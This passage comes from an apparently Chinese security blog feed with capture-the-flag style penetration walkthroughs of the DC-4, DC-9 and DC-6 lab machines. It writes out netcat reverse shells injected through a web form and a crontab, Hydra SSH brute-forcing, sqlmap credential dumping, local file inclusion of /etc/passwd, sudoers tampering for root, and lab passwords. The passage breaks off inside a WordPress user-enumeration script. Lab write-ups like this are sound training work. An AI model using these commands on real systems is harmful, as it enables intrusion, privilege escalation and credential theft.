application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://192.168.0.123</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.0.123/command.php</span><br><span class="line">Cookie: PHPSESSID=jj07s1dhaif60k528ttntgbfb3</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">radio=ls+-l&amp;submit=Run</span><br></pre></td></tr></table></figure><ul><li><p>我们可以修改radio的数据改成一个反弹shell的就可以</p></li><li><p>我们先监听8899端口 <code>nc -lvp 8899</code></p></li><li><p>然后把radio的数据改成：<code>nc 192.168.0.21 8899 -e /bin/bash</code></p></li><li><p>拿到shell就看到有有三个用户</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles  jim  sam</span><br></pre></td></tr></table></figure><ul><li><p>而且只有jim用户目录下有些东西：</p></li><li><pre><code>backups  mbox  test.sh<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-   但是mbox无法查看</span><br><span class="line"></span><br><span class="line">-   `test.sh`也不知道有啥用</span><br><span class="line"></span><br><span class="line">-   在jim/backups目录下看到一个old-password.bak，于是就拿来爆破jim的ssh密码</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="title">    hydra -l jim -P old-passwords.bak ssh:</span>//<span class="number">192.168</span>.<span class="number">0.123</span></span><br></pre></td></tr></table></figure></code></pre></li><li><p>得到密码： <code>host: 192.168.0.123   login: jim   password: jibril04</code></p></li><li><p>然后就是登录jim用户了 尝试进一步提权</p></li><li><p>这时候可以查看mbox了</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cat mbox</span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"UTF-8"</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a <span class="built_in">test</span>.</span><br></pre></td></tr></table></figure><ul><li>是邮件。一般邮件保存在<code>/var/mail</code>目录里面</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/var/mail$ cat jim</span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"UTF-8"</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I<span class="string">'m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is:  ^xHhA&amp;hvim0y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See ya,</span></span><br><span class="line"><span class="string">Charles</span></span><br></pre></td></tr></table></figure><ul><li><p>发现了<code>charles</code>的密码：<code>^xHhA&amp;hvim0y</code></p></li><li><p>我们先登录到<code>charles</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure><ul><li>登录之后sudo -l 发现</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure><ul><li>利用<code>/usr/bin/teehee</code>提权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/teehee -a /etc/crontab */1 * * * * nc 192.168.0.21 8899 -e /bin/bash</span><br></pre></td></tr></table></figure><ul><li><p>kali 监听8899端口，等1分钟</p></li><li><p>就可以获得root的shell了</p></li><li><p><img data-src="../images/mdImages/image-20200503161102432.png" alt="flag"></p></li></ul><h2><span id="the_end"><strong>!!!THE_END!!!</strong></span></h2><h2><span id="2-重要数据">2. 重要数据</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 网站账号密码：</span></span><br><span class="line">admin : happy</span><br><span class="line"><span class="comment"># 2. jim的ssh密码</span></span><br><span class="line">jibril04</span><br><span class="line"><span class="comment"># 3. charles的ssh密码</span></span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc4-靶机渗透&quot;&gt;DC4 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__the_end__&quot;&gt;&lt;strong&gt;!!!THE_END!!!&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-重要数据&quot;&gt;2. 重要数据&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-9 靶机渗透</title>
    <link href="https://atc96.top/DC-9/"/>
    <id>https://atc96.top/DC-9/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:29:32.858Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-9-靶机渗透">DC-9 靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li><li><a href="#__the_end__"><strong>THE_END!</strong></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-9-靶机渗透">DC-9 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li><p>初期脚本扫描</p></li><li><p>扫描结果</p></li><li><p><img data-src="../images/mdImages/image-20200505133218228.png" alt="image-20200505133218228"></p></li><li><p>可以发现 ip地址为：<code>192.168.0.114</code> ssh (但是ssh无法访问了) 和 http服务s</p></li><li><p>但是没有其他可用的信息 </p></li><li><p>爆破一下目录</p></li><li><p>我这里用御剑爆破</p></li><li><p>输入url： <a href="http://192.168.0.114" target="_blank" rel="noopener">http://192.168.0.114</a></p></li><li><p><img data-src="../images/mdImages/image-20200505135003390.png" alt="image-20200505135003390"></p></li><li><p>访问 <a href="http://192.168.0.114/index.php" target="_blank" rel="noopener">http://192.168.0.114/index.php</a> 是一个员工信息的主页</p></li><li><p>search.php 有一个搜索框。admin.php。是一个登陆界面</p></li><li><p>逐个fuzzing一下Sql注入</p></li><li><p><img data-src="../images/mdImages/image-20200505133904515.png" alt="image-20200505133904515"></p></li><li><p>可以发现存在sql注入</p></li><li><p>那就直接列表名</p></li><li><p><img data-src="../images/mdImages/image-20200505134248401.png" alt="image-20200505134248401"></p></li><li><p>列出User表的字段</p></li><li><p><img data-src="../images/mdImages/image-20200505134512164.png" alt="image-20200505134512164"></p></li><li><p>列出UserID，Username，Password字段的数据</p></li><li><p><img data-src="../images/mdImages/image-20200505134659369.png" alt="image-20200505134659369"></p></li><li><p>得到账号密码：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="string">'856f5de590ef37314e7c3bdf6f8a66dc'</span></span><br></pre></td></tr></table></figure><ul><li><p>密码是MD5的拿去破解一下</p></li><li><p><img data-src="../images/mdImages/image-20200505134842141.png" alt="image-20200505134842141"></p></li><li><p>得到真正的账号密码 <code>admin : transorbital1</code></p></li><li><p>再用sqlmap跑跑其他数据库</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql --dbs  //information_schema，Staff，还有一个新表users</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -tables    //UserDetails</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -T UserDetails --columns //firstname,id,lastname,password,reg_date,username</span><br><span class="line">sqlmap -u http://192.168.146.147/results.php --data=<span class="string">"search=1"</span> --dbms mysql -D users -T UserDetails -C id,firstname,lastname,password --dump</span><br></pre></td></tr></table></figure><ul><li><p>得到一堆密码</p></li><li><p><img data-src="../images/mdImages/image-20200505154932928.png" alt="image-20200505154932928"></p></li><li><p>先把他放到字典里，等下用来爆破用</p></li><li><p>登陆之后再welcome.php的下面看到<code>File does not exist</code></p></li><li><p>可能有LFI</p></li><li><p>使用<code>burpsuite</code>进行FUZZ</p></li><li><p>可以看到<code>/etc/passwd</code></p></li><li><p>提取用户名：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure><ul><li><p>本想用包含访问日志的，但是并不能包含访问日志，只能试试爆破SSH,但是SSH被过滤了</p></li><li><p>最后百度一大堆…</p></li><li><p>终于<a href="https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html</a></p></li><li><p>知道<code>/etc/knockd.conf</code>也许能解开22端口</p></li><li><p>在<a href="http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf" target="_blank" rel="noopener">http://192.168.0.114/welcome.php?file=../../../../../../etc/knockd.conf</a></p></li><li><p><img data-src="../images/mdImages/image-20200505154709439.png" alt="image-20200505154709439"></p></li><li><p>得到ssh防御策略</p></li><li><p>意思是依次访问 7469,8475,9842端口就能解开22端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.114 7469</span><br><span class="line">nc 192.168.0.114 8475</span><br><span class="line">nc 192.168.0.114 9842</span><br></pre></td></tr></table></figure><ul><li>然后再用 <code>Hydra</code>爆破ssh</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P result.txt -t 4 ssh://192.168.0.114</span><br></pre></td></tr></table></figure><ul><li><p>得到3个用户名密码</p></li><li><p><img data-src="../images/mdImages/image-20200505155536834.png" alt="image-20200505155536834"></p></li><li><p>登录进去看看呗</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh chandlerb@192.168.0.114   &gt;&gt; UrAG0D!</span><br><span class="line">ssh joeyt@192.168.0.114&gt;&gt; Passw0rd</span><br><span class="line">ssh janitor@192.168.0.114&gt;&gt; Ilovepeepee</span><br></pre></td></tr></table></figure><ul><li><p>都看了看，发现只有 <code>janitor</code>用户下有个有用的东西</p></li><li><p><img data-src="../images/mdImages/image-20200505154228962.png" alt="image-20200505154228962"></p></li><li><p>这里又有几个密码，做成字典爆破其他用户</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pwd.txt -t 6 ssh://192.168.0.114</span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200505160203999.png" alt="image-20200505160203999"></p></li><li><p>然后我们登录<code>fredf</code>用户</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fredf@192.168.0.114&gt;&gt; B4-Tru3-001</span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200505160402623.png" alt="image-20200505160402623"></p></li><li><p>发现 <code>/opt/devstuff/dist/test/test</code> 可以不用root密码执行</p></li><li><p>发现这是一个python打包好的程序</p></li><li><p>python文件在<code>/opt/devstuff/test.py</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc<span class="number">-9</span>:/opt/devstuff$ </span><br><span class="line">    cat test.py</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Usage: python test.py read append"</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[<span class="number">2</span>], <span class="string">"a"</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><ul><li><p>读取第一个参数的文件添加到第二个文件的里面</p></li><li><p>可以利用计划任务来反弹shell</p></li><li><p>先看看计划任务</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">17 *    * * * root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * * root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7 root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * * root      <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>先在/tmp目录下写上</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'*/1 * * * * root nc -e /bin/bash 192.168.0.21 8899'</span> &gt; /tmp/crontab-</span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200505161858371.png" alt="image-20200505161858371"></p></li><li><p>然后kali监听好，等一小会就能得到root权限了</p></li><li><p>等了半天发现没反应~，原来是没有nc</p></li><li><p>那就通过<code>/etc/sudoers</code>文件来给当前用户root权限</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'fredf    ALL=(ALL:ALL) ALL'</span> &gt; /tmp/sudo-</span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200505162742825.png" alt="image-20200505162742825"></p></li><li><p><img data-src="../images/mdImages/image-20200505162841981.png" alt="image-20200505162841981"></p></li><li><p>就完成了<del>~</del></p><h2><span id="the_end"><strong>THE_END!</strong></span></h2></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-9-靶机渗透&quot;&gt;DC-9 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__the_end__&quot;&gt;&lt;strong&gt;THE_END!&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-6 靶机渗透</title>
    <link href="https://atc96.top/DC-6/"/>
    <id>https://atc96.top/DC-6/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:18:52.380Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-6靶机渗透">DC-6靶机渗透</a><ul><li><a href="#1渗透过程">1.渗透过程</a></li><li><a href="#2-重要信息">2. 重要信息:</a></li><li><a href="#__~the~end~__"><strong><del>THE</del>END~</strong></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-6靶机渗透">DC-6靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul><li><p>写在前面：</p></li><li><p>靶机介绍内容提取：</p></li><li><blockquote><p>  <strong>NOTE</strong>: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</p><p>  192.168.0.142        wordy<br>  <strong>NOTE</strong>: I’ve used 192.168.0.142 as an example. You’ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.</p><p>  <strong>注意</strong>：您需要在pentesting设备上编辑主机文件，使其读取如下内容：</p><p>  192.168.0.142        wordy</p><p>  <strong>注</strong>：我以192.168.0.142为例。您需要使用常规方法来确定VM的IP地址，并相应地进行调整。</p><p>  <strong>Clue</strong><br>  OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p><p>  <code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code><br>  That should save you a few years. ;-)</p><p>  <strong>线索</strong></p><p>  好吧，这并不是一个真正的线索，但更多的是一些“我们不想花五年时间等待某个过程完成”之类的建议，给那些只想继续工作的人。</p><p>  <code>cat/usr/share/wordlists/rockyou.txt | grep k01&gt;passwords.txt</code></p><p>  这样可以省你几年的时间。;-)</p></blockquote></li><li><p>我们需要配置hosts文件</p></li><li><p>先把IP地址找出来：<code>netdiscover -r 192.168.0.1/24</code></p></li><li><p>找到IP地址为: <code>192.168.0.141</code></p></li><li><p>配hosts文件: <code>echo &#39;192.168.0.141        wordy&#39; &gt;&gt; /ectc/hosts</code></p></li><li><p>设置好了ping 一下试试…</p></li><li><p>namp 扫一下端口 : <code>namp -sS -A -p- 192.168.0.141</code></p></li><li><p>扫描结果:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-26 19:51 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wordy (192.168.0.141)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: WordPress 5.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">MAC Address: 00:0C:29:B9:86:10 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms wordy (192.168.0.141)</span><br></pre></td></tr></table></figure><ul><li><p>开了web和ssh</p></li><li><p>先看看web</p></li><li><p>用<code>Wappalyzer</code>看到网站时 <code>WordPress</code>的框架</p></li><li><p>好说,之前做过的~知道默认的后台地址:<a href="http://wordy/wp-login.php" target="_blank" rel="noopener">http://wordy/wp-login.php</a></p></li><li><p>这里分享一个专门枚举<code>WordPress</code>用户名的<code>python</code>脚本:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys,re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAuthor</span><span class="params">(_u)</span>:</span></span><br><span class="line">    url = _u</span><br><span class="line">    